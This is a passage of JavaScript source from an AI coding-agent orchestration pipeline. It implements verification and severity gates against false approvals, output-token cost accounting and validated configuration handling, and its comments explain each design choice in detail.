      : 'Run the migration collision/count check and report the result in `migrations_check` before this can be approved.',
  }

  return {
    ...verdict,
    status: 'changes_requested',
    issues: [...(verdict.issues || []), issue],
    summary: `${verdict.summary}\n\nMIGRATION GATE: ${what}`,
  }
}

// Neither approval branch in phaseCodeReview ever consulted `verification.verdict`,
// and markUnproven does not cover it — its own line only rescues a SKIPPED
// criterion, passing a `failed` verification straight through. Run
// wf_2b451aee-6ea therefore reported approved with 8 of 8 acceptance criteria
// failed on a zero-line diff. Enforced here rather than asked of the Reviewer,
// same reason as enforceMigrationGate: the Reviewer already said `failed` and
// the orchestrator approved anyway, so the missing check is the orchestrator's.
//
// The enum is treated by measurement over 34 real reviewer rounds, not by taste:
//   - 'partial' is not blocked wholesale, because markUnproven deliberately
//     forces a skipped criterion down to 'partial' and hands it back as NOT
//     PROVEN for the operator to run rather than as a refusal; blocking every
//     partial would undo that shipped behaviour. It blocks only when some
//     criterion actually says `failed`.
//   - 'nothing_to_drive' is the legitimate answer for a docs-only change or a
//     pure refactor with no runtime surface, and does not block on its own.
//   - ANY failed criterion blocks, whatever the verdict word says. 'verified'
//     or 'nothing_to_drive' alongside a `failed` criterion is a self-
//     contradicting verdict, and the itemized list outranks the one-word
//     summary of it. Unobserved in the 34-round corpus, so this costs nothing
//     against real data; it closes the one shape the enum check alone missed.
//   - an ABSENT verification block DOES block. VERDICT_SCHEMA requires only
//     ['status','summary'], so absence is reachable; 'nothing_to_drive' already
//     exists as the in-schema way to say there was nothing to drive; and 0 of
//     the 34 rounds ever omitted the block. An omission is therefore
//     indistinguishable from a Reviewer that forgot, and an unreported check
//     looks exactly like one that was never run.
// Applied to all 34 rounds, this rule newly blocks none of the 6 that were
// legitimately approved; the 11 it blocks were already changes_requested.
//
// Pure, and the pass path returns the SAME object reference on purpose — the
// call site detects firing by identity (gatedVerdict !== verdict), so an
// unconditional spread would mark every run as blocked forever.
function enforceVerificationGate(verdict) {
  const v = verdict.verification
  const criteria = Array.isArray(v?.criteria) ? v.criteria : []
  const failed = criteria.filter(c => c?.status === 'failed')

  // A failed criterion blocks whatever the summary word says. The enum and the
  // criteria list are written by the same model in one JSON object and nothing
  // makes them agree, so `{verdict:'verified', criteria:[{status:'failed'}]}` is
  // reachable; the earlier rule read the word and approved it. Between the two,
  // trust the itemized list: the enum is one token summarizing the very list
  // that contradicts it, and this is the same fail-safe direction the rest of
  // the gate takes. Costs a fix pass when a Reviewer mislabels; the other
  // direction approves a run with a criterion it just said failed.
  if (!failed.length && (v?.verdict === 'verified' || v?.verdict === 'nothing_to_drive')) return verdict
  if (v?.verdict === 'partial' && !failed.length) return verdict

  const what = (v?.verdict === 'verified' || v?.verdict === 'nothing_to_drive')
    ? `Verification reported '${v.verdict}' but ${failed.length} of ${criteria.length} acceptance criteria are marked failed — the verdict word contradicts its own criteria list, and the list is what was actually checked`
    : v?.verdict === 'failed'
    ? `Verification reported 'failed'${criteria.length ? ` — ${failed.length} of ${criteria.length} acceptance criteria failed` : ' with no criteria reported'}`
    : v?.verdict === 'partial'
      ? `Verification reported 'partial' with ${failed.length} failed criterion(s): ${failed.map(c => c.criterion || '(unnamed)').join('; ')}`
      : v?.verdict
        ? `Verification reported an unrecognized verdict '${v.verdict}' — only 'verified', 'partial', 'failed' and 'nothing_to_drive' are meaningful, so this is treated as an unrun check`
        : 'The Reviewer returned no verification block at all — an unreported check is indistinguishable from one that was never run, and `nothing_to_drive` is the in-schema way to say there was nothing to drive'

  const issue = {
    file: 'verification',
    severity: 'critical',
    what,
    suggestion: 'Drive the failing acceptance criteria and report them passing, or fix the code so they pass, before this can be approved.',
  }

  return {
    ...verdict,
    status: 'changes_requested',
    issues: [...(verdict.issues || []), issue],
    summary: `${verdict.summary}\n\nVERIFICATION GATE: ${what}`,
  }
}

async function agentWithModelFallback(prompt, opts, fallbackModel) {
  if (!fallbackModel) return runAgent(prompt, opts)
  try {
    const result = await runAgent(prompt, opts)
    if (result) return result
  } catch (err) {
    // A stall is not a model failure — the fallback model composes the same
    // long output and stalls the same way, so falling back turns 6 aborts
    // into 12. On the reviewer that's 36 minutes wasted instead of 18. runAgent
    // already logged the explanation; just let the stall propagate rather than
    // re-diagnosing it here as "model failed".
    if (isStallError(err)) throw err
    log(`  ↻ ${opts.label}: model '${opts.model}' failed (${err?.message || err}) — falling back to '${fallbackModel}'`)
    return runAgent(prompt, { ...opts, model: fallbackModel })
  }
  log(`  ↻ ${opts.label}: model '${opts.model}' returned nothing — falling back to '${fallbackModel}'`)
  return runAgent(prompt, { ...opts, model: fallbackModel })
}

// ── cost accounting ─────────────────────────
//
// PLACEMENT, settled once here because it is arguable both ways and the next
// editor will re-open it otherwise. The obvious home is `stats`, where a
// consumer already looks for a number about the run — complexity, coder_passes
// and files_mapped all live there. Top-level `cost` wins on two counts. `stats`
// is a flat bag of scalars, while this is a nested structure carrying a
// per-entry array and its own availability enum; flattening it would mean
// either dropping the per-phase entries or spraying five loose keys into a bag
// with no room for them. And every field on this result that QUALIFIES the
// outcome rather than counting something — full_suite_status, env_status,
// record_status, work_location — already sits top-level beside `approved` by
// deliberate precedent. A reading that may be unavailable is exactly that kind
// of qualifier.
//
// WHAT THE FIGURE IS NOT. Claude Code 2.1.263 documents budget.spent() as
// "output tokens spent this turn across the main loop and all workflows — the
// pool is shared, not per-workflow". Three consequences, each of which would
// otherwise be found the hard way by someone acting on the number: it is OUTPUT
// ONLY, with no input, cache-read or cache-write figure anywhere in the harness
// API, so it structurally cannot answer whether prompt caching is helping; the
// pool is SHARED, so a bracket around a phase measures what the whole turn
// burned during that phase and is a delta rather than an attribution — hence
// the field name output_tokens_delta; and it is PER-TURN, so every figure is
// relative to a baseline sampled at run start and never an absolute reading.
// That is why the note ships inside the block rather than living only in the
// README: the block travels to the Recorder and into a review report, far away
// from any prose written here.
const COST_ENTRIES_MAX = 40
const COST_NOTE = 'Output tokens only — no input tokens, no cache reads, no cache writes — so this figure cannot say whether prompt caching is helping, and on a measured run it was 0.2% of the bill. For the rest, run `scripts/ldo-cost.sh <transcriptDir>` after the run: the cache figures exist in the per-agent transcripts, just not here. A per-phase number is a delta measured around that phase, not an attribution: the token pool is shared across the whole turn.'

// The one shape `createCostLedger().finish()` returns when there was no ledger
// to finish. Written out twice at the two shapeResult call sites before this,
// verbatim, which made it a third definition of a shape that already had two —
// add a field to the cost block and you had to find every copy.
const COST_UNAVAILABLE = { status: 'unavailable', unit: 'output_tokens', total_output_tokens_delta: null, unattributed_output_tokens_delta: null, entries: [], concurrent: false, note: COST_NOTE, reason: 'the run finished without a cost ledger' }
// Two formatters, deliberately different. formatTokens is for the run log, where
// 768.9k reads faster than 768885. costFigure is for the Record prompt, where
// the Recorder is told to reproduce the numbers verbatim — a rounded k-figure
// copied into a report would be a number nobody can reconcile against anything.
// One line each, not wrapped: the gate scripts brace-extract declarations by
// walking to the first newline at depth zero, and a wrapped arrow body ends at
// the `=>`.
const formatTokens = n => !Number.isFinite(n) ? 'not measured' : Math.abs(n) >= 1000 ? `${(n / 1000).toFixed(1)}k` : String(Math.round(n))
const costFigure = n => Number.isFinite(n) ? String(Math.round(n)) : 'not measured'

// `budget` is a harness global. It exists today — three log lines in this file
// reference it bare — but a bare reference throws ReferenceError the instant a
// harness build stops injecting it, which would end a run over an accounting
// figure nothing gates on. Hence `typeof` before anything else; it is also what
// lets the gate drive the absent case at all.
// Every rejection returns a named reason instead of a number, and never 0: a
// zero here would be indistinguishable from a run that genuinely produced no
// output, which is the defect class record_status, env_status and
// full_suite_status each already exist to close.
// Every other `budget` read in this file goes through readSpent, which reports
// an absent or broken global instead of raising. These three log lines did not,
// and one of them runs BEFORE the ledger is built — so a harness that stopped
// injecting the global would kill the run with a ReferenceError there, and the
// unavailable path the gate proves would never be reached in a real run. A
// degradation that cannot be reached is not a degradation; it is a test that
// passes. Returns a formatted string, or null for "no target set / not
// knowable", which both callers already treat as nothing to print.
function budgetRemaining() {
  if (typeof budget === 'undefined') return null
  try {
    if (!budget || !budget.total || typeof budget.remaining !== 'function') return null
    const left = budget.remaining()
    if (typeof left !== 'number' || !Number.isFinite(left)) return null
    return `${Math.round(left / 1000)}k`
  } catch { return null }
}

function readSpent() {
  // The `typeof` guard first, alone, because it is the one test that cannot
  // throw. Everything after it is inside the try — including the shape check:
  // `budget.spent` is a property read, and a property read runs a getter. A
  // shape check outside the try therefore has its own way to throw, past every
  // catch, and would end a run over a figure nothing branches on. That is the
  // whole point of this function returning a reason instead of raising one.
  if (typeof budget === 'undefined') return { ok: false, reason: 'the harness exposed no `budget` global' }
  let value
  try {
    if (!budget || typeof budget.spent !== 'function') return { ok: false, reason: 'the harness `budget` object exposes no spent function' }
    value = budget.spent()
  } catch (err) {
    // Not swallowed: this message becomes the `reason` on the cost block, which
    // is printed in the run log, carried on the result and rendered into the
    // Record prompt. Rethrowing would end a run over a figure nothing branches on.
    return { ok: false, reason: `the harness spent function threw: ${err?.message || err}` }
  }
  if (typeof value !== 'number' || !Number.isFinite(value) || value < 0) {
    const shown = typeof value === 'string' ? JSON.stringify(value) : String(value)
    return { ok: false, reason: `the harness spent function returned ${shown}, which is not a finite non-negative number` }
  }
  return { ok: true, value }
}

// Entries are an ordered array that is only ever appended to, never a map keyed
// by label: agentWithRetry and agentWithModelFallback both re-enter runAgent
// under the same label, and both attempts cost real output tokens. A
// label-keyed store would silently report one retry's cost as the whole thing.
// Nothing here can throw. Every read goes through readSpent, which converts a
// missing global, a wrong shape and a throwing call alike into a named reason —
// so a broken accounting path degrades to an honest "not measured" rather than
// taking a run's real work down with it.
function createCostLedger(options) {
  const concurrent = !!(options && options.concurrent)
  const base = readSpent()
  const entries = []
  let sampleFailures = 0
  let droppedEntries = 0

  const open = (phase, label) => {
    const start = readSpent()
    let closed = false
    return () => {
      // runAgent closes in a `finally`, which runs once — the guard is for the
      // caller that ever wraps it in a retry and closes twice.
      if (closed) return
      closed = true
      const end = readSpent()
      const entry = { phase: phase || 'unknown', label: label || 'unknown', output_tokens_delta: null }
      if (!start.ok) {
        entry.unavailable_reason = start.reason
        sampleFailures++
      } else if (!end.ok) {
        entry.unavailable_reason = end.reason
        sampleFailures++
      } else if (end.value < start.value) {
        // A shared per-turn counter that moved backwards means the reading is
        // not what this code assumes it is. null with a reason, never a negative
        // and never a clamped 0 — a 0 would report the phase as free.
        entry.unavailable_reason = 'the reading went backwards'
        sampleFailures++
      } else {
        entry.output_tokens_delta = end.value - start.value
      }
      if (entries.length < COST_ENTRIES_MAX) entries.push(entry)
      else droppedEntries++
    }
  }

  const finish = () => {
    const end = readSpent()
    const reasons = []
    let total = null
    if (!base.ok) reasons.push(`the run-start baseline could not be read: ${base.reason}`)
    else if (!end.ok) reasons.push(`the final reading could not be taken: ${end.reason}`)
    else if (end.value < base.value) reasons.push('the total reading went backwards between run start and run end')
    else total = end.value - base.value

    if (sampleFailures) reasons.push(`${sampleFailures} of ${entries.length + droppedEntries} per-phase reading(s) could not be measured`)
    // Past the cap the per-phase list no longer accounts for the total, which is
    // a different defect from a failed sample but the same lie if reported as
    // 'measured'. It rides in the reason rather than in a key of its own,
    // because the block's shape is what the Recorder reproduces.
    if (droppedEntries) reasons.push(`${droppedEntries} entr(ies) past the ${COST_ENTRIES_MAX}-entry cap were not recorded, so the per-phase figures do not add up to the total`)

    const status = !base.ok
      ? 'unavailable'
      : (total === null || sampleFailures > 0 || droppedEntries > 0) ? 'partial' : 'measured'

    const attributed = entries.reduce((sum, e) => Number.isFinite(e.output_tokens_delta) ? sum + e.output_tokens_delta : sum, 0)

    return {
      status,
      unit: 'output_tokens',
      total_output_tokens_delta: total,
      // Never clamped at zero. Under parallel features the pool is shared, so a
      // sibling's output lands inside this feature's brackets and the remainder
      // can legitimately go negative. That negative is the evidence the deltas
      // overlap, which is precisely what clamping would hide.
      unattributed_output_tokens_delta: total === null ? null : total - attributed,
      entries,
      concurrent,
      note: COST_NOTE,
      ...(status === 'measured' ? {} : { reason: reasons.join('; ') || 'no reason was recorded' }),
    }
  }

  return { open, finish }
}

// One log line per feature. The unavailable form says in words that this is not
// a zero, because an operator scanning a log reads a missing cost line and a
// `0` the same way — as "cheap" — and only one of those is true.
function renderCostLine(cost) {
  const overlap = cost?.concurrent ? 'these deltas overlap with the other features running in parallel and do not partition the pool.' : ''
  if (!cost || cost.status === 'unavailable') {
    return `Cost accounting unavailable — ${collapseLines(cost?.reason) || 'no reason was recorded'}. The run still spent output tokens; they could not be measured.`
      + (overlap ? ` Also, ${overlap}` : '')
  }
  const parts = capList((Array.isArray(cost.entries) ? cost.entries : []).map(e => `${collapseLines(e?.label)} ${formatTokens(e?.output_tokens_delta)}`))
  const partial = cost.status === 'measured' ? '' : ` [partial: ${collapseLines(cost.reason) || 'no reason was recorded'}]`
  return `Cost (output tokens, delta from run start): ${formatTokens(cost.total_output_tokens_delta)} total`
    + (parts.length ? ` — ${parts.join(', ')}` : '')
    + partial
    + (overlap ? ` — ${overlap}` : '')
}

// The only prompt text this whole feature adds, and it goes to exactly one
// phase. agents/recorder.md's report template has no Cost section, so the
// instruction to produce one has to travel with the block — the same way the
// CONTRACT CANDIDATES and DESIGN DOC DRIFT blocks carry their own.
// Nothing model-authored is interpolated: the labels are composed here from a
// slugified ctx.label and a fixed role name, the phases are literals in this
// file, and every figure is an integer. Both still go through collapseLines and
// costFigure, so a future label built from something looser cannot forge a
// heading or smuggle prose in as a number.
function renderCost(cost) {
  if (!cost) return ''
  const measured = cost.status === 'measured'
  const lines = ['\n\n## COST (output tokens — record only)', COST_NOTE, `- Total: ${costFigure(cost.total_output_tokens_delta)}`]
  capList((Array.isArray(cost.entries) ? cost.entries : []).map(e => `- ${collapseLines(e?.label)} (${collapseLines(e?.phase)}): ${costFigure(e?.output_tokens_delta)}`)).forEach(l => lines.push(l))
  // The second half is conditional: on an unavailable block, promising a total
  // "elsewhere" contradicts the line two rows up saying nothing could be
  // measured, and sends the reader looking for a number that does not exist.
  // "larger" is dropped for the same reason it was never safe — the Record
  // phase's own delta can legitimately be 0 if the counter did not move.
  lines.push(Number.isFinite(cost?.total_output_tokens_delta)
    ? '- Your own Record phase is NOT in these figures: this block was composed before you were called, so nothing here could include it. The run log and the returned result carry a later total that does.'
    : '- Your own Record phase is NOT in these figures either: this block was composed before you were called. The later reading on the run log and the result is reported as not measured for the same reason given above.')
  if (cost.concurrent) lines.push('- These deltas overlap with the other features that ran in parallel and do not partition the pool.')
  if (!measured) lines.push(`- This run's accounting is ${cost.status}: ${collapseLines(cost.reason) || 'no reason was recorded'}. The run still spent output tokens; they could not be measured.`)
  lines.push(measured
    ? 'Reproduce this as a `## Cost` section at the end of the review report — the sentence above it and these figures verbatim. Add nothing: no price estimate, no inferred input token count, no per-model rate, no total you worked out yourself.'
    : 'Reproduce this as a `## Cost` section at the end of the review report, and write every figure that reads "not measured" as exactly that — never a zero, never an estimate. A zero would say the run was free, which is false. Add nothing else: no price estimate, no inferred input token count.')
  return lines.join('\n')
}

// The pipeline's own version, kept in lockstep with .claude-plugin/plugin.json,
// .claude-plugin/marketplace.json (three copies), the `<!-- ldo:version -->`
// stamp skills/ldo-init writes into a project's CLAUDE.md, and the newest
// CHANGELOG heading — scripts/check-version-lockstep.sh is what holds them
// together. It exists because a CLAUDE.md block written by 2.31.0 is
// byte-indistinguishable from a current one, and until now the running
// pipeline could not have reported the mismatch even against a stamped block:
// nothing in this file knew what version it was. Logged once per run so the
// operator has the other half of that comparison in front of them.
// Nothing here reads or branches on the stamp — the stamp is a hint to re-run
// /ldo-init, never a check, because an agent-written marker in a repo file
// proves nothing about what surrounds it.
const LDO_VERSION = '2.52.0'

// ═══════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════

const CONFIG = args?.config || {}
const MAX_FIX_LOOPS = CONFIG.maxFixLoops || 3
// Which severities hold the fix loop. Resolved and validated rather than read
// raw, for a reason no other key in this block shares: a bad value everywhere
// else degrades a run loudly, while a bad value HERE makes `isBlocking` false
// for every issue — each review reports `0 blocking`, the loop ends on its
// first pass, and the run reports approved with its criticals intact, with
// nothing in the log to say why. `["Critical","Major"]` is enough to do it,
// because VERDICT_SCHEMA constrains severity to lowercase.
//
// The allowlist is READ OUT of that schema rather than restated, so a severity
// added to VERDICT_SCHEMA cannot be rejected here by a second copy that nobody
// updated. Written to fail toward the full default: should that read ever
// yield nothing, every configured value is rejected and the default stands —
// an empty allowlist that warns and defaults is safe, one that honours
// whatever is left is not.
const SEVERITY_VALUES = VERDICT_SCHEMA?.properties?.issues?.items?.properties?.severity?.enum || []
const DEFAULT_BLOCKING_SEVERITIES = ['critical', 'major']

function resolveBlockingSeverities(configured) {
  const warnings = []
  const keepDefault = () => ({ severities: [...DEFAULT_BLOCKING_SEVERITIES], warnings })
  const expected = `expected an array of ${SEVERITY_VALUES.join('|')}, lowercase`
  const keeping = `Keeping the full default [${DEFAULT_BLOCKING_SEVERITIES.join(', ')}]`
  if (configured === undefined) return keepDefault()
  // Every rejection keeps the FULL default rather than the valid remainder of
  // what was written. A partial list is indistinguishable from a deliberate
  // narrowing, and guessing at it resolves the ambiguity in the one direction
  // that makes the gate smaller.
  if (!Array.isArray(configured)) {
    warnings.push(`config.blockingSeverities is invalid (${JSON.stringify(collapseLines(configured))}) — ${expected}. ${keeping}`)
    return keepDefault()
  }
  if (!configured.length) {
    warnings.push(`config.blockingSeverities is an empty list — nothing would block, every issue would be advisory, and the run would report approved over its own criticals. ${keeping}`)
    return keepDefault()
  }
  // Collapsed and capped before it reaches a `⚠` line, exactly as
  // contractWarnings and renderDesignDrift treat their inputs: CONFIG is
  // composed from CLAUDE.md, which on a contributed branch is repo content, so
  // an entry spelled `\n## ISSUES` would otherwise forge a section header in a
  // log the operator reads as orchestrator output.
  const rejected = configured.filter(s => !SEVERITY_VALUES.includes(s))
  if (rejected.length) {
    warnings.push(`config.blockingSeverities has ${rejected.length} unrecognised entry(ies): ${capList(rejected.map(r => JSON.stringify(collapseLines(r)))).join(', ')} — ${expected}. ${keeping}`)
    return keepDefault()
  }
  const severities = [...new Set(configured)]
  // `critical` is not removable, and the override is deliberate rather than a
  // warning: a warning is transient, while the run's `result` — what /ldo-ship
  // and the operator's tracking entry read — would carry no trace of a gate
  // narrowed to nothing. The comment beside the verification gate names half
  // this hazard already and guards only its own injected issue; a config that
  // could make a real critical advisory reopens the same false-approval path
  // for every other one. An operator who wants a critical merged still can —
  // by reading the report and merging it — which is a decision with a person
  // attached, not a silently green run.
  if (!severities.includes('critical')) {
    warnings.push(`config.blockingSeverities omits 'critical' (${JSON.stringify(severities.join(', '))}) — overridden: 'critical' always blocks, so no configuration can make a critical finding advisory. Using [${['critical', ...severities].join(', ')}]`)
    severities.unshift('critical')
  }
  return { severities, warnings }
}

// The nested blocks — planner, tests, backlog, design, stallMs — each warn on a
// key they do not recognise, and README promises that behaviour three times.
// The top level had no such loop at all, so `blockingSeverity`, `maxfixloops`
// or `researchByDefaults` was read by nobody and reported by nobody. Same rule,
// one level up.
const CONFIG_KEYS = ['models', 'maxFixLoops', 'blockingSeverities', 'maxParallelFeatures', 'planner', 'tests', 'backlog', 'design', 'stallMs', 'researchByDefault', 'securityByDefault']

function unknownConfigKeys(cfg) {
  if (cfg === undefined || cfg === null) return []
  // An `args.config` that is not an object is not "no config": every setting
  // the operator wrote is being ignored, and that has to be said rather than
  // resolved into silence one default at a time.
  if (typeof cfg !== 'object' || Array.isArray(cfg)) {
    return [`config is not an object (${JSON.stringify(collapseLines(cfg))}) — every setting in it is being ignored. Expected an object with keys: ${CONFIG_KEYS.join(', ')}`]
  }
  // `_`-prefixed keys are skipped deliberately. ldo-config.example.json carries
  // `_README`, `_models_note`, `_phases` and eight more as pseudo-comments, and
  // operators copy that file's contents into their CLAUDE.md — an allowlist
  // without this exemption fires on this project's own documented example,
  // which is how an operator learns that the warning means nothing.
  const unknown = Object.keys(cfg).filter(k => !k.startsWith('_') && !CONFIG_KEYS.includes(k))
  // A key NAME is as operator-authored as a value is, and reaches the same log
  // line, so it gets the same collapse the rejected severities above get; the
  // list is capped so a config carrying a thousand stray keys yields a bounded
  // block plus `+N more` rather than a thousand lines.
  return capList(unknown.map(k => `config.${collapseLines(k, 80)} is not a known key — ignored. Keys: ${CONFIG_KEYS.join(', ')}`))
}

const { severities: BLOCKING_SEVERITIES, warnings: BLOCKING_WARNINGS } = resolveBlockingSeverities(CONFIG.blockingSeverities)
BLOCKING_WARNINGS.forEach(w => log(`⚠ ${w}`))
unknownConfigKeys(CONFIG).forEach(w => log(`⚠ ${w}`))
// Dice coefficient over distinct normalized tokens; see matchIssueKey for the
// corpus this is calibrated against and why lowering it is not an improvement.
const ISSUE_MATCH_THRESHOLD = 0.45
const DO_RESEARCH = args?.research ?? CONFIG.researchByDefault ?? false
// A top-level arg like `isolate`/`research`, not a config key: it describes
// what this one invocation should do, not how the project is set up. Stops the
// pipeline after Plan — and after Security when the surface is elevated —
// returning the plan instead of implementing it.
const PLAN_ONLY = args?.planOnly === true
// A recovered plan describes ONE feature and cannot be keyed to a label, so
// it's rejected outright in multi-feature mode rather than silently applied
// to just the first task or silently ignored with no explanation.
let RESUME_PLAN = args?.resumePlan
if (args?.resumePlan !== undefined && Array.isArray(args?.tasks)) {
  RESUME_PLAN = undefined
  log('⚠ resumePlan is ignored in multi-feature mode (args.tasks) — one recovered plan cannot be keyed to a feature. Every feature will be planned normally.')
}
const MAX_PARALLEL_FEATURES = CONFIG.maxParallelFeatures || 12

const PLANNER_CONFIG = CONFIG.planner || {}
const DEFAULT_MAX_STEPS_PER_RUN = 8
let MAX_STEPS_PER_RUN = DEFAULT_MAX_STEPS_PER_RUN
if (PLANNER_CONFIG.maxStepsPerRun !== undefined) {
  const n = Number(PLANNER_CONFIG.maxStepsPerRun)
  if (Number.isFinite(n) && n >= 1) MAX_STEPS_PER_RUN = n
  else log(`⚠ config.planner.maxStepsPerRun is invalid (${JSON.stringify(PLANNER_CONFIG.maxStepsPerRun)}) — expected a number of steps, at least 1. Keeping default ${DEFAULT_MAX_STEPS_PER_RUN}`)
}
// Only an explicit `false` disables it. A truthy typo ("no", 0-as-string)
// would otherwise flip the operator's stated preference in the direction they
// didn't ask for, silently.
const PREFER_SPLIT = PLANNER_CONFIG.preferSplit !== false
// Same reason the stallMs merge warns on an unrecognised role: a typo'd key is
// never read, so the operator's setting is dropped with nothing in the log to
// say it was. Guarding the value while leaving the key unguarded catches only
// half the mistake.
for (const key of Object.keys(PLANNER_CONFIG)) {
  if (!['maxStepsPerRun', 'preferSplit'].includes(key)) log(`⚠ config.planner.${key} is not a known key — ignored. Keys: maxStepsPerRun, preferSplit`)
}

// A single run used to execute the full suite 5-8 times: the Coder's baseline,
// its per-step runs and its end-of-pass run, the Reviewer's own run, and the
// two runs the revert-and-rerun proof needs to watch one test flip — all of it
// again on every fix round, up to MAX_FIX_LOOPS.
// The default is `scoped` rather than opt-in because a cost cut nobody hears
// about reaches nobody, and it is only defensible as a default because two
// other things hold: fullSuiteAt 'final-pass' still runs the whole suite once
// at the end of each Coder pass, and markFullSuite makes a run that never ran
// it say so on the result instead of returning a bare `approved: true`. Change
// either of those and scoped-by-default stops being safe.
const TESTS_CONFIG = CONFIG.tests || {}
const TEST_SCOPES = ['scoped', 'full']
const FULL_SUITE_POINTS = ['final-pass', 'ship', 'never']
const DEFAULT_TEST_SCOPE = 'scoped'
const DEFAULT_FULL_SUITE_AT = 'final-pass'
let TEST_SCOPE = DEFAULT_TEST_SCOPE
if (TESTS_CONFIG.scope !== undefined) {
  if (TEST_SCOPES.includes(TESTS_CONFIG.scope)) TEST_SCOPE = TESTS_CONFIG.scope
  else log(`⚠ config.tests.scope is invalid (${JSON.stringify(TESTS_CONFIG.scope)}) — expected ${TEST_SCOPES.join('|')}. Keeping default ${DEFAULT_TEST_SCOPE}`)
}
let FULL_SUITE_AT = DEFAULT_FULL_SUITE_AT
if (TESTS_CONFIG.fullSuiteAt !== undefined) {
  if (FULL_SUITE_POINTS.includes(TESTS_CONFIG.fullSuiteAt)) FULL_SUITE_AT = TESTS_CONFIG.fullSuiteAt
  else log(`⚠ config.tests.fullSuiteAt is invalid (${JSON.stringify(TESTS_CONFIG.fullSuiteAt)}) — expected ${FULL_SUITE_POINTS.join('|')}. Keeping default ${DEFAULT_FULL_SUITE_AT}`)
}
// Same reason as the planner and stallMs key loops: a value guard catches half
// the mistake, and the operator believes a setting took effect either way.
for (const key of Object.keys(TESTS_CONFIG)) {
  if (!['scope', 'fullSuiteAt'].includes(key)) log(`⚠ config.tests.${key} is not a known key — ignored. Keys: scope, fullSuiteAt`)
}

// Where backlog items go. The default is the file, and GitHub is opt-in,
// because publishing to an external service is a capability the host safety
// classifier refuses on the operator's behalf — and it refuses the ATTEMPT,
// not the publication. A Recorder told to probe `gh auth status` and fall back
// is therefore not a Recorder with a fallback: field report #4 measured three
// runs in one session where that first command ended the agent, so the review
// report and architecture doc — the artifacts the phase exists for, neither of
// which has anything to do with GitHub — were never written either. Hence a
// resolved directive rendered into the prompt rather than a choice left to the
// agent: on 'file' it must not run `gh` at all, not even to see whether it
// could.
// Resolved once at module scope, validated against an allowlist, and never
// rendered raw — same shape and same reasons as TESTS_CONFIG above.
const BACKLOG_DESTINATIONS = ['file', 'github']
const DEFAULT_BACKLOG_DESTINATION = 'file'
const BACKLOG_KEYS = ['destination']
function resolveBacklogDestination(cfg) {
  const c = cfg || {}
  const warnings = []
  let destination = DEFAULT_BACKLOG_DESTINATION
  if (c.destination !== undefined) {
    if (BACKLOG_DESTINATIONS.includes(c.destination)) destination = c.destination
    else warnings.push(`config.backlog.destination is invalid (${JSON.stringify(c.destination)}) — expected ${BACKLOG_DESTINATIONS.join('|')}. Keeping default ${DEFAULT_BACKLOG_DESTINATION}`)
  }
  for (const key of Object.keys(c)) {
    if (!BACKLOG_KEYS.includes(key)) warnings.push(`config.backlog.${key} is not a known key — ignored. Keys: ${BACKLOG_KEYS.join(', ')}`)
  }
  return { destination, warnings }
}
const { destination: BACKLOG_DESTINATION, warnings: BACKLOG_WARNINGS } = resolveBacklogDestination(CONFIG.backlog)
BACKLOG_WARNINGS.forEach(w => log(`⚠ ${w}`))

log(`LDO ${LDO_VERSION}`)

// The directive is a prompt block rather than a flag the agent interprets, for
// the same reason renderFullSuiteDirective is one: agents/recorder.md has to
// hold for both settings at once, so the run-specific half — which of the two
// destinations is permitted THIS run — can only come from here. The 'file'
// text forbids the probe explicitly; "prefer the file" would leave a Recorder
// free to check first, which is the exact command that ends it.
const BACKLOG_DIRECTIVES = {
  file: `## BACKLOG DESTINATION — FILE\nBacklog items go to the file convention in your agent definition. Do NOT run \`gh\`. Do not run \`gh auth status\`, do not check whether \`gh\` exists, and do not create a GitHub issue: publishing to GitHub is opt-in and is not enabled for this project, and the attempt itself — not the publication — is what gets a Recorder refused, which loses the review report and architecture doc too. Report \`backlog.destination: "file"\`.\n\n`,
  github: `## BACKLOG DESTINATION — GITHUB\nThe operator opted in via \`config.backlog.destination: "github"\`. Create one GitHub issue per backlog item. Apply the label \`backlog\` only if that label already exists in the repo — do not create it. Check first with \`gh issue list --repo <this repo> --limit 1\` — a listing that returns, even an empty one, proves \`gh\` runs, is authorized for this repo, AND that issues are enabled on it. Do not probe with \`gh auth status\`: it has been measured failing on a machine where \`gh\` was alive and authorized, and it cannot see whether issues are enabled at all. If that listing fails, fall back to the file convention in your agent definition, report \`backlog.destination: "file"\`, and say in \`notes\` what the listing reported.\n\n`,
}
// `Object.hasOwn`, not `[destination] || default`: a plain object literal
// inherits `constructor`, `toString` and friends, so a bare lookup on one of
// those names returns an inherited FUNCTION and the fallback never fires —
// the prompt would then carry a stringified function where the destination
// rule belongs. Unreachable from the only call site today, which passes the
// already-validated BACKLOG_DESTINATION; the fallback exists for the caller
// that doesn't validate, which is exactly the one that would hit this.
const renderBacklogDirective = destination => Object.hasOwn(BACKLOG_DIRECTIVES, destination) ? BACKLOG_DIRECTIVES[destination] : BACKLOG_DIRECTIVES[DEFAULT_BACKLOG_DESTINATION]

// ── design-doc drift ────────────────────────
//
// LDO does not own a project's design documents — no format, no template, no
// skill; README, "What LDO does not own", argues why. What it owns is the one
// check that needs no format at all. Issue #20 measured 4 of 46 design files
// untouched for six weeks while the code they describe moved, and detecting
// that takes a glob, a path, and the files this run already reported changing.
// No filesystem access is involved or needed: this is pure string matching over
// data the orchestrator is holding anyway.
//
// The values are semi-untrusted, which is why they are validated harder than a
// config value normally would be. CONFIG is `args.config`, composed by the
// calling agent out of CLAUDE.md — repo content — so on a contributed branch or
// a vendored copy someone else prepared, these strings came from that repo. And
// `doc` is rendered into the Record prompt, where an agent holding Write, Edit
// and Bash reads it. safeMigrationsDir is the existing validator for exactly
// this class (absolute, `..`, a segment starting with `.` or `-`, anything
// outside SAFE_REL_PATH); reusing it beats writing a second, weaker one, and
// its name says "migrations" only because that was its first caller.
const DESIGN_MAP_MAX = 40
// A glob is walked against every changed file, so its length is a cost
// multiplier, not just a value. Both limits bound that walk. Neither is a
// safety boundary — globMatch below has no backtracking to exploit — and
// neither may be treated as one: a glob well inside both can still be
// pathological for any matcher that backtracks.
const DESIGN_GLOB_MAX = 200
const DESIGN_GLOB_WILDCARDS_MAX = 10
const DESIGN_KEYS = ['map']
const DESIGN_ENTRY_KEYS = ['glob', 'doc']

function resolveDesignMap(cfg) {
  const c = cfg || {}
  const warnings = []
  const map = []
  for (const key of Object.keys(c)) {
    if (!DESIGN_KEYS.includes(key)) warnings.push(`config.design.${key} is not a known key — ignored. Keys: ${DESIGN_KEYS.join(', ')}`)
  }
  if (c.map === undefined) return { map, warnings }
  if (!Array.isArray(c.map)) {
